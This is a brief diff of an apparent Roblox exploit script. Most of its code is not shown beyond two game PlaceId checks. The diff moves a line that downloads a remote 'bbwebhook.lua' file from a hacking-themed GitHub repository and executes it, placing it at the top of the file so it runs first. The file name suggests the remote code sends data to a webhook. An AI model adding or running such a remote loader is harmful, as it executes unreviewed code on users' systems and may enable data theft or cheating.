@@ -1,3 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/bbwebhook.lua"))()
+
+
 if game.PlaceId == 15144787112 then
 
 
@@ -85,5 +88,3 @@ elseif game.PlaceId == 13772394625 then
 
 
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/bbwebhook.lua"))()
